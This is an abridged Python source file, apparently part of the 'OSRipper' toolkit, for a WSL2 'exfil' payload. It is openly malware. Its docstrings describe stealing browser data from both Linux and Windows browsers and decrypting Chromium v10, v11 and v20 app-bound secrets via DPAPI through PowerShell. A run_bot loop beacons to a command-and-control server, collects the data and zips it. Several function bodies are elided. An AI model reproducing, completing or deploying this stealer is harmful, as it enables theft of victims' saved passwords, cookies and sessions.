#!/usr/bin/env python3
"""
OSRipper Exfil — WSL2 Payload
Platform: Windows Subsystem for Linux 2 (WSL2)
Extracts browser data from BOTH Linux and Windows (via /mnt/c/) browsers.
Uses DPAPI-via-PowerShell for Windows browser decryption from WSL.
...
def _derive_v20_key_wsl(browser_base):
    """
    Extract the v20 app-bound AES key from Local State via DPAPI and,
    if needed, the browser elevation-service COM object (PowerShell on WSL).
    """
    if not browser_base:
        return None
    ...
    try:
        ...
        browser_name = (
            browser_base.parts[-2].lower() if len(browser_base.parts) >= 2 else ''
        )
...
def chromium_decrypt_v20(blob, browser_base):
    """Decrypt a v20 App-Bound blob (AES-256-GCM) using the derived app-bound key."""
...
def chromium_decrypt(blob, key, browser_base=None):
    ...
    v20: App-Bound Encryption (Chrome/Edge 127+) — key from Local State via WSL.
    v10/v11: 32-byte key (Windows/WSL) -> AES-256-GCM; 16-byte (Linux) -> AES-128-CBC.
    """
    try:
        if not blob:
            return ''
...
def run_bot():
    if C2_MODE in ('c2',):
        _c2_beacon('WSL2 exfil agent online')
        while True:
            try:
                data = collect_all()
                zp = make_zip(data)
